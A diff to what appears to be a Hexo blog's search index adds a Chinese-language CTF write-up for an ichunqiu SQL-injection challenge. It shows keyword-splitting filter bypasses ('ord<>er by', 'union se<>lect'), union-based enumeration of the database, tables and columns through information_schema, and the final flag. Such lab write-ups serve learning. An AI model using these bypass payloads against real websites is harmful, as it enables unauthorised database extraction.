@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>ichunqiuSQL</title>
+      <link href="/2019/07/31/ichunqiuSQL/"/>
+      <url>/2019/07/31/ichunqiuSQL/</url>
+      
+        <content type="html"><![CDATA[<h1 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h1><p><a href="https://www.ichunqiu.com/battalion中web的SQL" target="_blank" rel="noopener">https://www.ichunqiu.com/battalion中web的SQL</a></p><a id="more"></a><p>一开始的样子:</p><img src="/2019/07/31/ichunqiuSQL/start.png"><p>这题跟平常有点不一样,这题我尝试’ , “ , ‘“ , ‘) , “) , ‘“)都是不行的</p><p>然后直接什么都不加倒是可以直接来玩</p><h1 id="猜列数"><a href="#猜列数" class="headerlink" title="猜列数"></a>猜列数</h1><p>输入一个order by 4  会提示</p><blockquote><p>inj code!</p></blockquote><p>于是用注释符</p><p>最后发现这题只能用&lt;&gt;这种注释符</p><blockquote><p>ord&lt;&gt;er by 4</p></blockquote><p>无回显</p><blockquote><p>ord&lt;&gt;er by 3</p></blockquote><p>这下显示正常了</p><h1 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h1><blockquote><p>union se&lt;&gt;lect 1,2,3</p></blockquote><p>发现只有2显示</p><p>即可以利用2的这个位置来获取信息</p><blockquote><p>union se&lt;&gt;lect 1,database(),3</p></blockquote><img src="/2019/07/31/ichunqiuSQL/db.png" title="dbname"><h1 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h1><blockquote><p>union se&lt;&gt;lect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()</p></blockquote><img src="/2019/07/31/ichunqiuSQL/table.png" title="tables"><h1 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h1><blockquote><p>union se&lt;&gt;lect 1,group_concat(column_name),3 from information_schema.columns where table_name=’user’</p></blockquote><img src="/2019/07/31/ichunqiuSQL/start.png"><p>跟开始一样,没有任何信息</p><p>试一试另外一个表</p><blockquote><p>union se&lt;&gt;lect 1,group_concat(column_name),3 from information_schema.columns where table_name=’info’</p></blockquote><img src="/2019/07/31/ichunqiuSQL/column.png" title="columns"><p>我看到有flag字样的马上去提交…发现是错误的</p><h1 id="值"><a href="#值" class="headerlink" title="值"></a>值</h1><blockquote><p>union se&lt;&gt;lect 1,flAg_T5ZNdrm,3 from info</p></blockquote><img src="/2019/07/31/ichunqiuSQL/flag.png" title="flag"><p>成功爆出了flag</p><p>flag{e41571b9-ea94-4e24-8f52-f1158e7036c8}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>sqli-labs-les18</title>
       <link href="/2019/07/31/sqli-labs-les18/"/>
       <url>/2019/07/31/sqli-labs-les18/</url>
